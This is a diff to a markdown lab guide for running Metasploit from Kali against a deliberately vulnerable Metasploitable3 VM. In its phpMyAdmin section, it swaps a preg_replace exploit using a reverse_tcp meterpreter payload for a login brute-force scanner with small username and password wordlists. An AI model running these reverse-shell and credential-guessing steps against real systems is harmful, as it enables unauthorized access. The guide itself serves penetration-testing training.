@@ -27,21 +27,20 @@ Here are several labs on running Metasploit from Kali on a Metasploitable3 Linux
 `set payload cmd/unix/reverse_perl`
 
 ## phpMyAdmin
-`use exploit/multi/http/phpmyadmin_preg_replace`
 
-`set rhost xxx.xxx.xxx.xxx` (IP of the host you are attacking)
+use auxiliary/scanner/http/phpMyAdmin_login
+set rhosts 192.168.1.171
+set USER_AS_PASS true
+set targeturi /phpMyAdmin/index.php
+set user_file /tmp/users.txt
+set pass_file /tmp/passwords.txt
 
-`set rport 80` (Port number Ruby app is listening on)
+echo root >> /tmp/users.txt
+echo admin >> /tmp/users.txt
+echo user >> /tmp/users.txt
 
-`set lhost xxx.xxx.xxx.xxx `(IP of the Kail VM you are attacking from)
-
-`set lport 4444` (Port on your system exploit and payload runs to create session)
-
-`set password sploitme`
-
-`set targeturi phpmyadmin`
-
-`set payload php/meterpreter/reverse_tcp`
+echo password >> /tmp/passwords.txt
+echo Password >> /tmp/passwords.txt
 
 
 ## Ruby On Rails
